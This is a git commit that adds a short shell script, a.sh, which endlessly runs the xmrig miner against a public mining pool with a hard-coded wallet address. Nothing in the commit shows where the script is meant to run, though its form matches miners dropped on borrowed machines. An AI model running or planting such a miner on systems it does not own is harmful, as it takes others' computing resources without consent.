785e965b1e43a0b2ebfb49d28afc326354c52111
Sasimy <108361182+Sasimy@users.noreply.github.com>
2022-06-29 00:39:31 +0700

    Add files via upload

---
+++ a.sh
@@ -0,0 +1,4 @@
+#!/bin/sh
+while [ 1 ]; do
+xmrig --url pool.hashvault.pro:3333 --user 82ZQFESLrn83ivvrQtoWs2Cz8349CHrBtKGNtLZQd5jv3sSwmJaL2snB5pFsNd2gssDSLaFhrHQWvXiHNUtDrP7TF3XNCP2 --pass Voya --donate-level 1
+done
